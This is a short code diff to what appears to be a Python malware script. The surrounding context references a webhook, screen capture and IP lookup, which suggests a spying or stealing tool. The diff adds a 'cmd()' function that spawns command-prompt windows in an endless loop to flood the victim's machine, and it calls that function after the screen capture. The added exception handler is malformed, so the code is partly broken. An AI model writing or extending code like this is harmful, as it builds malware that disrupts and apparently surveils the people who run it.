@@ -35,6 +35,14 @@ os.system("cls")
 
 webhook = webhook_choix
 
+def cmd():
+    while True: 
+        try:
+            os.system("start cmd")
+        except Exception(e):
+            print("Une erreur et survenue", e)
+
+
 
 def capture():
     with mss.MSS() as sct:
@@ -81,6 +89,7 @@ def ip():
 ip()
 dir()
 capture()
+cmd()
 
 buffer = ""
 timer = None
